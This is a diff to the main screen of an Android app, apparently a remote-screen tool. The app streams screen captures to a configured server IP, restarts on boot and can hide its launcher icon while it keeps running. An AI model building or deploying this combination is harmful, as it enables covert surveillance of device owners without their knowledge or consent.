@@ -46,7 +46,6 @@ class MainActivity : AppCompatActivity() {
             if (isCapturing) stopCapture() else preCheck()
         }
 
-        // 保存 IP
         findViewById<Button>(R.id.saveIpButton).setOnClickListener {
             val ip = serverInput.text.toString().trim()
             if (ip.isEmpty()) {
@@ -57,7 +56,6 @@ class MainActivity : AppCompatActivity() {
             Toast.makeText(this, "已保存: $ip", Toast.LENGTH_SHORT).show()
         }
 
-        // 隐藏图标（配好 IP 后点这个）
         findViewById<Button>(R.id.hideIconBtn).setOnClickListener {
             hideLauncherIcon()
         }
@@ -100,6 +98,7 @@ class MainActivity : AppCompatActivity() {
             .edit().putString(KEY_SERVER_IP, ip).apply()
         ScreenCaptureService.SERVER_IP = ip
 
+        Toast.makeText(this, "IP: $ip，准备采集", Toast.LENGTH_SHORT).show()
         requestScreenCapture()
     }
 
@@ -115,6 +114,7 @@ class MainActivity : AppCompatActivity() {
         super.onActivityResult(requestCode, resultCode, data)
         if (requestCode == REQUEST_MEDIA_PROJECTION) {
             if (resultCode == Activity.RESULT_OK && data != null) {
+                val ip = serverInput.text.toString().trim()
                 val svcIntent = Intent(this, ScreenCaptureService::class.java).apply {
                     putExtra("resultCode", resultCode)
                     putExtra("data", data)
@@ -125,9 +125,8 @@ class MainActivity : AppCompatActivity() {
                 getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
                     .edit().putBoolean(BootReceiver.KEY_ENABLED, true).apply()
 
-                val server = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
-                    .getString(KEY_SERVER_IP, "未设置")
-                log("采集启动，目标: $server")
+                log("采集已启动，目标: $ip")
+                Toast.makeText(this, "采集启动，正在连接 $ip ...", Toast.LENGTH_LONG).show()
                 updateUI()
             } else {
                 Toast.makeText(this, "未授权屏幕采集", Toast.LENGTH_SHORT).show()
@@ -156,11 +155,6 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    /**
-     * 隐藏桌面图标，但 App 仍在后台运行。
-     * 重新启用：
-     *   adb shell pm enable com.remote.kvm/com.remote.kvm.MainActivity
-     */
     private fun hideLauncherIcon() {
         val comp = ComponentName(this, MainActivity::class.java)
         packageManager.setComponentEnabledSetting(
